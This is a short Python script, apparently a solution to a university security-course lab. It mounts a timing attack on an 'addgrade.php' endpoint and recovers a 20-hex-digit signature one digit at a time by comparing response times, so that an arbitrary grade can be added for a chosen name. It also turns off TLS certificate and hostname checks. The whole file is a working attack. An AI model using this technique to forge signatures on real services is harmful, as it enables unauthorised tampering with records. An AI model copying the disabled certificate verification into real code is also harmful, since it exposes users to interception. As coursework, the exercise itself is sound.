import string
import time
import urllib.request
import ssl


hexa = string.hexdigits[:16]
sig = list("00000000000000000000")
bestTime = 0
def buildurl(name,sig,grade):
    return "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name={}&grade={}&signature={}".format(name,grade,"".join(sig))

print(len(sig))
print(hexa)
x = hexa[0]
print(x)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE #Python/min dator/manjaro gillar inte ert certifikat, kan ju lika gärna vara NSA som lyssnar nu!11!

name = input("Name: ")
grade = input("Grade: ")
for i in range(0, 20):
    testsig = list(sig)

    for k in hexa:
        testsig[i] = k
        curTime  = 0
        print("HAXXXING IN PROGRESS: ","".join(testsig), "\r",end='')
        for z in range(0,5):
            start = time.clock()
            with urllib.request.urlopen(buildurl(name,testsig,grade), context=ctx) as response:
                stop = time.clock()
                curTime = curTime + (stop-start)


        print(curTime)
        if curTime > bestTime:
                bestTime = curTime
                best = k
                print(k)
                print(bestTime)

    sig[i] = best
print("HAXXXING COMPLETE: ","".join(sig))
